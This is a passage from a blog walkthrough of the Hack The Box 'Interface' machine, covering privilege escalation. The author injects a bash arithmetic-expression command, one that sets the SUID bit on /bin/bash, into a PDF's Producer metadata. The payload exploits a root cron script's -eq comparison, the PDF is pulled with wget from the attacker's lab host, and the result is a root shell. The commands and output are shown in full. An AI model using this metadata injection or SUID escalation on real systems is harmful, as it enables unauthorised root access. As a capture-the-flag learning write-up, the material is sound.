+</span></span><span class=line><span class=cl>        <span class=nv>meta_producer</span><span class=o>=</span><span class=k>$(</span>/usr/bin/exiftool -s -s -s -Producer <span class=s2>&#34;</span><span class=nv>$cfile</span><span class=s2>&#34;</span> 2&gt;/dev/null <span class=p>|</span> cut -d <span class=s2>&#34; &#34;</span> -f1<span class=k>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>[[</span> <span class=s2>&#34;</span><span class=nv>$meta_producer</span><span class=s2>&#34;</span> -eq <span class=s2>&#34;dompdf&#34;</span> <span class=o>]]</span><span class=p>;</span> <span class=k>then</span>
+</span></span><span class=line><span class=cl>            <span class=nb>echo</span> <span class=s2>&#34;Removing </span><span class=nv>$cfile</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl>            rm <span class=s2>&#34;</span><span class=nv>$cfile</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=k>fi</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>fi</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>done</span>
+</span></span></code></pre></td></tr></table></div></div><p>This script loops through files in <code>/tmp</code>, running <code>exiftool</code> on each to get the Producer field from metadata. If this field is <code>dompdf</code> (somewhat expected when our web app uses this engine to generate temp PDF files we can download), then the file is deleted. We can see this looks to be initiated regularly as a cron job, and runs as root (UID=0).</p><p>The first thing standing out is that maybe we can command inject by setting the Producer metadata field &ndash; given we can write to and control files in <code>/tmp</code>. However, our script above <code>cut</code>s on space, so we either need to use a space bypass technique such as base64 or the Internal Field Separator in bash &ndash; which is the environment variable <code>$IFS</code> used by bash for determining separated word sequences.</p><p>I kept getting syntax errors here, until I came across this: <a href="https://www.vidarholen.net/contents/blog/?p=716" target=_blank rel="noopener noreffer">Bash&rsquo;s white collar eval: [[ $var -eq 42 ]] runs arbitrary code too – Vidar&rsquo;s Blog</a></p><p>The script checks producer using <code>[[ "$meta_producer" -eq "dompdf" ]];</code> which is vulnerable to arbitrary code execution. In essence, we can force the <code>eq</code> operator to evaluate <code>"$meta_producer"</code> as an arithmetic expression. Bash will evaluate constructs such as <code>a[$(whoami)]+42</code> where the shell expects an integer &ndash; given we are indexing into array <code>a[]</code> and adding integer 42.</p><p>With that in mind, we set the Producer metadata field on a test PDF. This will use <code>chmod</code> to set the SetUID bit on <code>/bin/bash</code> for the owner (hence the <code>u+s</code>, where <code>u</code> is root). We also include the Internal Field Seperator <code>${IFS}</code> as mentioned above, to bypass <code>cut</code>. This should allow us to run bash as root:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$exiftool</span> -Producer<span class=o>=</span><span class=s1>&#39;a[$(chmod${IFS}u+s${IFS}/bin/bash)]+42&#39;</span> test.pdf
+</span></span><span class=line><span class=cl>    <span class=m>1</span> image files updated
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$exiftool</span> test.pdf
+</span></span><span class=line><span class=cl>ExifTool Version Number         : 12.16
+</span></span><span class=line><span class=cl>File Name                       : test.pdf
+</span></span><span class=line><span class=cl>Directory                       : .
+</span></span><span class=line><span class=cl>File Size                       : 4.5 KiB
+</span></span><span class=line><span class=cl>File Modification Date/Time     : 2023:04:01 21:01:52+11:00
+</span></span><span class=line><span class=cl>File Access Date/Time           : 2023:04:01 21:01:52+11:00
+</span></span><span class=line><span class=cl>File Inode Change Date/Time     : 2023:04:01 21:01:52+11:00
+</span></span><span class=line><span class=cl>File Permissions                : rwxr-x---
+</span></span><span class=line><span class=cl>File Type                       : PDF
+</span></span><span class=line><span class=cl>File Type Extension             : pdf
+</span></span><span class=line><span class=cl>MIME Type                       : application/pdf
+</span></span><span class=line><span class=cl>PDF Version                     : 1.7
+</span></span><span class=line><span class=cl>Linearized                      : No
+</span></span><span class=line><span class=cl>Page Count                      : <span class=m>1</span>
+</span></span><span class=line><span class=cl>XMP Toolkit                     : Image::ExifTool 12.16
+</span></span><span class=line><span class=cl>Producer                        : a<span class=o>[</span><span class=k>$(</span>chmod<span class=si>${</span><span class=nv>IFS</span><span class=si>}</span>u+s<span class=si>${</span><span class=nv>IFS</span><span class=si>}</span>/bin/bash<span class=k>)</span><span class=o>]</span>+42
+</span></span><span class=line><span class=cl>Create Date                     : 2023:04:01 08:11:14+00:00
+</span></span><span class=line><span class=cl>Modify Date                     : 2023:04:01 08:11:14+00:00
+</span></span></code></pre></td></tr></table></div></div><p>We use <code>wget</code> to retrieve this PDF, and save this into <code>/tmp/test.pdf</code> on our target, and wait a little for the cron job to kick in. We see <code>/bin/bash</code> with SUID bit set, and we are able to run <code>bash -p</code>, to not reset the effective user ID, so bash runs in privileged mode as root &ndash; giving us a root shell, and the root flag!:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bash-4.4$ <span class=nb>cd</span> /tmp
+</span></span><span class=line><span class=cl><span class=nb>cd</span> /tmp
+</span></span><span class=line><span class=cl>bash-4.4$ wget http://10.10.14.15:8081/test.pdf
+</span></span><span class=line><span class=cl>wget http://10.10.14.15:8081/test.pdf
+</span></span><span class=line><span class=cl>--2023-04-01 10:11:50--  http://10.10.14.15:8081/test.pdf
+</span></span><span class=line><span class=cl>Connecting to 10.10.14.15:8081... connected.
+</span></span><span class=line><span class=cl>HTTP request sent, awaiting response... <span class=m>200</span> OK
+</span></span><span class=line><span class=cl>Length: <span class=m>4576</span> <span class=o>(</span>4.5K<span class=o>)</span> <span class=o>[</span>application/pdf<span class=o>]</span>
+</span></span><span class=line><span class=cl>Saving to: <span class=s1>&#39;test.pdf&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>test.pdf.1          100%<span class=o>[===================</span>&gt;<span class=o>]</span>   4.47K  --.-KB/s    in 0.001s  
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>2023-04-01 10:11:50 <span class=o>(</span>3.19 MB/s<span class=o>)</span> - <span class=s1>&#39;test.pdf&#39;</span> saved <span class=o>[</span>4576/4576<span class=o>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>bash-4.4$ ls -la /bin/bash
+</span></span><span class=line><span class=cl>ls -la /bin/bash
+</span></span><span class=line><span class=cl>-rwsr-xr-x <span class=m>1</span> root root <span class=m>1113504</span> Apr <span class=m>18</span>  <span class=m>2022</span> /bin/bash
+</span></span><span class=line><span class=cl>bash-4.4$ /bin/bash -p 
+</span></span><span class=line><span class=cl>bash-4.4# id
+</span></span><span class=line><span class=cl>id
+</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>euid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span>
+</span></span><span class=line><span class=cl>bash-4.4# cat /root/root.txt
+</span></span><span class=line><span class=cl>cat /root/root.txt
+</span></span><span class=line><span class=cl>f64108af50796213d7a500029861c6cc
+</span></span><span class=line><span class=cl>bash-4.4# 
+</span></span></code></pre></td></tr></table></div></div><p>And we&rsquo;re done!</p><h2 id=conclusion>Conclusion</h2><p>When enumerating, I missed the subdomain in the response headers, which led to a whole lot of nothing. With the API endpoint found, fuzzing the query parameter and determining the functionality was fairly straight forward.</p><p>The presence of a command injection into the cleanup script seemed obvious, but I hadn&rsquo;t come across this particular flavour (arithmetic expression) of injection before.</p><p>This machine was another reminder to take enumeration slowly and be deliberate &ndash; don&rsquo;t just fuzz and spray payloads at endpoints blindly hoping to find something.</p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 2023-05-13&nbsp;<a class=git-hash href=https://github.com/m-dwyer/emdwyer.github.io/commit/ea6c2468c3d5c8674b25660515af08b573db9337 target=_blank title="commit by m-dwyer(13535330+m-dwyer@users.noreply.github.com) ea6c2468c3d5c8674b25660515af08b573db9337: Add interface walkthrough">
+<i class="fas fa-hashtag fa-fw" aria-hidden=true></i>ea6c246</a></span></div></div><div class=post-info-line><div class=post-info-md><span><a class=link-to-markdown href=/2023-05-13-interface-htb/index.md target=_blank>Read Markdown</a></span></div><div class=post-info-share><span><a href=javascript:void(0); title="Share on Linkedin" data-sharer=linkedin data-url=https://emdwyer.github.io/2023-05-13-interface-htb/><i class="fab fa-linkedin fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Hacker News" data-sharer=hackernews data-url=https://emdwyer.github.io/2023-05-13-interface-htb/ data-title="Interface HTB Walkthrough"><i class="fab fa-hacker-news fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Line" data-sharer=line data-url=https://emdwyer.github.io/2023-05-13-interface-htb/ data-title="Interface HTB Walkthrough"><i data-svg-src=https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg aria-hidden=true></i></a><a href=javascript:void(0); title="Share on 微博" data-sharer=weibo data-url=https://emdwyer.github.io/2023-05-13-interface-htb/ data-title="Interface HTB Walkthrough"><i class="fab fa-weibo fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw" aria-hidden=true></i>&nbsp;<a href=/tags/htb/>htb</a>,&nbsp;<a href=/tags/security/>security</a>,&nbsp;<a href=/tags/penetration-testing/>penetration testing</a>,&nbsp;<a href=/tags/pdf/>pdf</a>,&nbsp;<a href=/tags/rce/>rce</a>,&nbsp;<a href=/tags/exif/>exif</a>,&nbsp;<a href=/tags/cve-2022-28368/>CVE-2022-28368</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span></section></div><div class=post-nav><a href=/2023-04-22-investigation-htb/ class=prev rel=prev title="Investigation HTB Walkthrough"><i class="fas fa-angle-left fa-fw" aria-hidden=true></i>Investigation HTB Walkthrough</a></div></div><div id=comments><div id=valine class=comment></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://valine.js.org/>Valine</a>.</noscript></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2022 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank>emdwyer</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
+</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=/lib/valine/valine.min.css><script type=text/javascript src=https://cdn.jsdelivr.net/npm/valine@1.5.0/dist/Valine.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:50},comment:{valine:{appId:"QGzwQXOqs5JOhN4RGPOkR2mR-MdYXbMMI",appKey:"WBmoGyJtbqUswvfLh6L8iEBr",avatar:"mp",el:"#valine",emojiCDN:"https://cdn.jsdelivr.net/npm/emoji-datasource-google@14.0.0/img/google/64/",emojiMaps:{100:"1f4af.png",alien:"1f47d.png",anger:"1f4a2.png",angry:"1f620.png",anguished:"1f627.png",astonished:"1f632.png",black_heart:"1f5a4.png",blue_heart:"1f499.png",blush:"1f60a.png",bomb:"1f4a3.png",boom:"1f4a5.png",broken_heart:"1f494.png",brown_heart:"1f90e.png",clown_face:"1f921.png",cold_face:"1f976.png",cold_sweat:"1f630.png",confounded:"1f616.png",confused:"1f615.png",cry:"1f622.png",crying_cat_face:"1f63f.png",cupid:"1f498.png",dash:"1f4a8.png",disappointed:"1f61e.png",disappointed_relieved:"1f625.png",dizzy:"1f4ab.png",dizzy_face:"1f635.png",drooling_face:"1f924.png",exploding_head:"1f92f.png",expressionless:"1f611.png",face_vomiting:"1f92e.png",face_with_cowboy_hat:"1f920.png",face_with_hand_over_mouth:"1f92d.png",face_with_head_bandage:"1f915.png",face_with_monocle:"1f9d0.png",face_with_raised_eyebrow:"1f928.png",face_with_rolling_eyes:"1f644.png",face_with_symbols_on_mouth:"1f92c.png",face_with_thermometer:"1f912.png",fearful:"1f628.png",flushed:"1f633.png",frowning:"1f626.png",ghost:"1f47b.png",gift_heart:"1f49d.png",green_heart:"1f49a.png",grimacing:"1f62c.png",grin:"1f601.png",grinning:"1f600.png",hankey:"1f4a9.png",hear_no_evil:"1f649.png",heart:"2764-fe0f.png",heart_decoration:"1f49f.png",heart_eyes:"1f60d.png",heart_eyes_cat:"1f63b.png",heartbeat:"1f493.png",heartpulse:"1f497.png",heavy_heart_exclamation_mark_ornament:"2763-fe0f.png",hole:"1f573-fe0f.png",hot_face:"1f975.png",hugging_face:"1f917.png",hushed:"1f62f.png",imp:"1f47f.png",innocent:"1f607.png",japanese_goblin:"1f47a.png",japanese_ogre:"1f479.png",joy:"1f602.png",joy_cat:"1f639.png",kiss:"1f48b.png",kissing:"1f617.png",kissing_cat:"1f63d.png",kissing_closed_eyes:"1f61a.png",kissing_heart:"1f618.png",kissing_smiling_eyes:"1f619.png",laughing:"1f606.png",left_speech_bubble:"1f5e8-fe0f.png",love_letter:"1f48c.png",lying_face:"1f925.png",mask:"1f637.png",money_mouth_face:"1f911.png",nauseated_face:"1f922.png",nerd_face:"1f913.png",neutral_face:"1f610.png",no_mouth:"1f636.png",open_mouth:"1f62e.png",orange_heart:"1f9e1.png",partying_face:"1f973.png",pensive:"1f614.png",persevere:"1f623.png",pleading_face:"1f97a.png",pouting_cat:"1f63e.png",purple_heart:"1f49c.png",rage:"1f621.png",relaxed:"263a-fe0f.png",relieved:"1f60c.png",revolving_hearts:"1f49e.png",right_anger_bubble:"1f5ef-fe0f.png",robot_face:"1f916.png",rolling_on_the_floor_laughing:"1f923.png",scream:"1f631.png",scream_cat:"1f640.png",see_no_evil:"1f648.png",shushing_face:"1f92b.png",skull:"1f480.png",skull_and_crossbones:"2620-fe0f.png",sleeping:"1f634.png",sleepy:"1f62a.png",slightly_frowning_face:"1f641.png",slightly_smiling_face:"1f642.png",smile:"1f604.png",smile_cat:"1f638.png",smiley:"1f603.png",smiley_cat:"1f63a.png",smiling_face_with_3_hearts:"1f970.png",smiling_imp:"1f608.png",smirk:"1f60f.png",smirk_cat:"1f63c.png",sneezing_face:"1f927.png",sob:"1f62d.png",space_invader:"1f47e.png",sparkling_heart:"1f496.png",speak_no_evil:"1f64a.png",speech_balloon:"1f4ac.png","star-struck":"1f929.png",stuck_out_tongue:"1f61b.png",stuck_out_tongue_closed_eyes:"1f61d.png",stuck_out_tongue_winking_eye:"1f61c.png",sunglasses:"1f60e.png",sweat:"1f613.png",sweat_drops:"1f4a6.png",sweat_smile:"1f605.png",thinking_face:"1f914.png",thought_balloon:"1f4ad.png",tired_face:"1f62b.png",triumph:"1f624.png",two_hearts:"1f495.png",unamused:"1f612.png",upside_down_face:"1f643.png",weary:"1f629.png",white_frowning_face:"2639-fe0f.png",white_heart:"1f90d.png",wink:"1f609.png",woozy_face:"1f974.png",worried:"1f61f.png",yawning_face:"1f971.png",yellow_heart:"1f49b.png",yum:"1f60b.png",zany_face:"1f92a.png",zipper_mouth_face:"1f910.png",zzz:"1f4a4.png"},enableQQ:!1,highlight:!0,lang:"en",pageSize:10,placeholder:"Your comment ...",recordIP:!0,serverURLs:"https://leancloud.hugoloveit.com",visitor:!0}},search:{highlightTag:"em",lunrIndexURL:"/index.json",maxResultLength:10,noResultsFound:"No results found",snippetLength:30,type:"lunr"}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>
